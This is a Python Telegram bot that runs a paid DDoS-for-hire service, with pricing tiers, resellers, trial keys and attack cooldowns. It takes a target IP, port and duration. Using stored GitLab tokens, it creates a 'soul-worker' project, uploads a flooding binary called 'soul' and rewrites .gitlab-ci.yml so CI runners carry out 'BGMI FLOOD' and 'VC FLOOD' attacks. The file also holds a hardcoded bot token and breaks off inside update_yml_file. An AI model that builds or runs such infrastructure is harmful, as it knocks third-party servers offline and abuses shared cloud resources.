#sudo apt update && sudo apt install -y python3 python3-pip python3-venv && pip install python-telegram-bot python-gitlab httpx
import asyncio
import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from telegram.request import HTTPXRequest
import gitlab
from gitlab.exceptions import GitlabError, GitlabAuthenticationError, GitlabGetError

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8588957951:AAFW9MLV6aVE3VNz888Xpe9n8dyMK4rgMFU"
YML_FILE_PATH = ".gitlab-ci.yml"
BINARY_FILE_NAME = "soul"
ATTACK_HISTORY_FILE = "attack_history.json"
ADMIN_IDS = [6928794159]
TARGET_PROJECT_NAME = "soul-worker"  # NEW: Name of project to auto-create

# Conversation states
WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_ATTACK_IP = 7
WAITING_FOR_ATTACK_PORT = 8
WAITING_FOR_ATTACK_TIME = 9
WAITING_FOR_ADD_USER_ID = 10
WAITING_FOR_ADD_USER_DAYS = 11
WAITING_FOR_REMOVE_USER_ID = 12
WAITING_FOR_TRIAL_HOURS = 13
WAITING_FOR_OWNER_ADD_ID = 14
WAITING_FOR_OWNER_ADD_USERNAME = 15
WAITING_FOR_OWNER_REMOVE_ID = 16
WAITING_FOR_RESELLER_ADD_ID = 17
WAITING_FOR_RESELLER_ADD_CREDITS = 18
WAITING_FOR_RESELLER_ADD_USERNAME = 19
WAITING_FOR_RESELLER_REMOVE_ID = 20
WAITING_FOR_TOKEN_ADD = 21
WAITING_FOR_TOKEN_REMOVE = 22
WAITING_FOR_TOKEN_FILE = 23  # NEW: State for token file upload

# Attack management
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 05
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}

# Temporary storage for multi-step operations
temp_data = {}

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_gitlab_tokens():
    try:
        with open('gitlab_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_gitlab_tokens(tokens):
    with open('gitlab_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 1)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)

def load_attack_history():
    try:
        with open(ATTACK_HISTORY_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_attack_history(history):
    with open(ATTACK_HISTORY_FILE, 'w') as f:
        json.dump(history, f, indent=2)

def append_attack_history(entry):
    attack_history.append(entry)
    if len(attack_history) > 200:
        del attack_history[:-200]
    save_attack_history(attack_history)

# Load all data
authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
gitlab_tokens = load_gitlab_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()
attack_history = load_attack_history()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until

    if MAINTENANCE_MODE:
        return False, "⚠️ **MAINTENANCE MODE**\n━━━━━━━━━━━━━━━━━━━━━\nBot is under maintenance. Please wait."

    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ **MAXIMUM ATTACK LIMIT REACHED**\n━━━━━━━━━━━━━━━━━━━━━\nYou have used all {MAX_ATTACKS} attack(s). Contact admin for more."

    if current_attack is not None:
        return False, "⚠️ **ERROR: ATTACK ALREADY RUNNING**\n━━━━━━━━━━━━━━━━━━━━━\nPlease wait until the current attack finishes."

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ **COOLDOWN REMAINING**\n━━━━━━━━━━━━━━━━━━━━━\nPlease wait {remaining_time} seconds before starting new attack."

    return True, "✅ Ready to start attack"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "GAME"
    elif ip.startswith(('15', '96')):
        return None, "⚠️ Invalid IP - IPs starting with '15' or '96' are not allowed"
    else:
        return "BGMI FLOOD", "GAME"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()

    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

    append_attack_history({
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "time": time_val,
        "method": method
    })

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until

    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))

        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }

    return {"status": "ready"}

def process_attack_tokens(ip, port, attack_duration, method):
    results = []

    def update_single_token(token_data):
        try:
            result = update_yml_file(
                token_data['token'],
                token_data['group_id'],
                ip, port, attack_duration, method
            )
            results.append((token_data.get('group_name', 'Unknown'), result))
        except Exception:
            results.append((token_data.get('group_name', 'Unknown'), False))

    threads = []
    seen_groups = set()
    unique_tokens = []
    for token_data in gitlab_tokens:
        if token_data.get('group_id') in seen_groups:
            continue
        seen_groups.add(token_data.get('group_id'))
        unique_tokens.append(token_data)

    for token_data in unique_tokens:
        thread = threading.Thread(target=update_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    return results

def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)

    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)

    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)

    if key not in trial_keys:
        return False, "Invalid key"

    key_data = trial_keys[key]

    if key_data["used"]:
        return False, "Key already used"

    if time.time() > key_data["expiry"]:
        return False, "Key expired"

    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)

    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)

    return True, f"✅ Trial access activated for {key_data['hours']} hours!"

# ==================== NEW FUNCTIONS FOR GROUP-BASED ARCHITECTURE ====================

def find_or_create_project_in_group(token, group_id, project_name=TARGET_PROJECT_NAME):
    """
    Find or create a project within a GitLab group.
    
    Args:
        token: GitLab API token
        group_id: GitLab group ID
        project_name: Name of project to find or create (default: soul-worker)
        
    Returns:
        tuple: (project_object, was_created_bool, error_message)
    """
    try:
        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
        gl.auth()
        
        # Get the group
        try:
            group = gl.groups.get(group_id)
        except GitlabGetError:
            return None, False, f"Group ID {group_id} not found or no access"
        
        # List all projects in the group
        projects = group.projects.list(all=True)
        
        # Search for existing project with the target name
        for project in projects:
            if project.name.lower() == project_name.lower():
                # Found existing project, get full project object
                full_project = gl.projects.get(project.id)
                logger.info(f"✅ Found existing project '{project_name}' (ID: {project.id}) in group {group_id}")
                return full_project, False, None
        
        # Project doesn't exist, create it
        try:
            new_project = gl.projects.create({
                'name': project_name,
                'namespace_id': group_id,
                'visibility': 'private',
                'initialize_with_readme': True
            })
            logger.info(f"✅ Created new project '{project_name}' (ID: {new_project.id}) in group {group_id}")
            return new_project, True, None
        except Exception as e:
            return None, False, f"Failed to create project: {str(e)}"
            
    except GitlabAuthenticationError:
        return None, False, "Failed to authenticate with GitLab token"
    except Exception as e:
        return None, False, f"Error: {str(e)}"

def get_target_project_from_group(token, group_id, preferred_name="Lumen"):
    """
    Get target project from a group. Looks for preferred name first, then soul-worker, then first available.
    
    Args:
        token: GitLab API token
        group_id: GitLab group ID
        preferred_name: Preferred project name (default: "Lumen")
        
    Returns:
        tuple: (project_object, project_name, error_message)
    """
    try:
        gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
        gl.auth()
        
        # Get the group
        try:
            group = gl.groups.get(group_id)
        except GitlabGetError:
            return None, None, f"Group ID {group_id} not found"
        
        # List all projects in the group
        projects = group.projects.list(all=True)
        
        if not projects:
            return None, None, "No projects found in group"
        
        # Priority 1: Look for preferred name (e.g., "Lumen")
        for project in projects:
            if project.name.lower() == preferred_name.lower():
                full_project = gl.projects.get(project.id)
                return full_project, project.name, None
        
        # Priority 2: Look for "soul-worker"
        for project in projects:
            if project.name.lower() == TARGET_PROJECT_NAME.lower():
                full_project = gl.projects.get(project.id)
                return full_project, project.name, None
        
        # Priority 3: Use first available project
        first_project = gl.projects.get(projects[0].id)
        return first_project, projects[0].name, None
        
    except Exception as e:
        return None, None, f"Error: {str(e)}"

def setup_group_automatically(token, group_id, binary_content=None):
    """
    Automatically setup a group with soul-worker project, binary, and CI/CD.
    
    Args:
        token: GitLab API token
        group_id: GitLab group ID
        binary_content: Binary file content (optional, will try to load from file if not provided)
        
    Returns:
        tuple: (success, project_id, message)
    """
    try:
        # Step 1: Find or create soul-worker project
        project, was_created, error = find_or_create_project_in_group(token, group_id, TARGET_PROJECT_NAME)
        
        if project is None:
            return False, None, f"Failed to setup project: {error}"
        
        project_id = project.id
        
        # Step 2: Upload binary file if available
        if binary_content is None:
            if os.path.exists(BINARY_FILE_NAME):
                with open(BINARY_FILE_NAME, 'rb') as f:
                    binary_content = f.read()
        
        if binary_content:
            success, msg = upload_binary_to_single_project(token, project_id, binary_content)
            if not success:
                logger.warning(f"⚠️ Binary upload failed: {msg}")
        
        status = "created and configured" if was_created else "found and configured"
        return True, project_id, f"Project '{TARGET_PROJECT_NAME}' {status} successfully"
        
    except Exception as e:
        return False, None, f"Setup failed: {str(e)}"

def update_yml_file(token, group_id, ip, port, time_val, method):
    """
    Create/update .gitlab-ci.yml file
